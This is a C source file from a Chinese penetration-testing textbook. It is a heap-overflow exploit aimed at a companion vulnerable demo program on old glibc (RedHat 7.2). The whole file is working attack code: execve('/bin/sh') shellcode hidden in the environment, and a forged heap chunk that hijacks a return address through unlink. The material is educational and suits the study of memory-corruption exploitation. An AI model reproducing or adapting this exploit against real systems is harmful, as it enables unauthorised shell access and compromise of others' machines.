/* exp.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  针对vul.c的堆溢出利用程序，使用老版本glibc的情况
*  测试平台：RedHat 7.2
*/

#include <stdio.h>
#include <stdlib.h>

#define RETLOC      0x40152a80
#define VUL         "./vul"

#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2

char shellcode[] =
"\xeb\x0a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

main (int argc, char **argv)
{
    char    buf[32];
    char    *args[] = {VUL, buf, NULL};
    char    *env[]  = {shellcode, NULL};

    unsigned int retloc = RETLOC;
    unsigned int shaddr = 0xbffffffc - (strlen(VUL) + 1) - (strlen(shellcode) + 1);
    unsigned int fake_chunk[] = {
        0xffffffff & ~PREV_INUSE,
        0xffffffff,
        retloc - 12,
        shaddr,
    };

    memset(buf, 0, sizeof(buf));
    memset(buf, 'A', 16);
    memcpy(buf + 16, fake_chunk, sizeof(fake_chunk));

    execve(args[0], args, env);
} /* End of main */
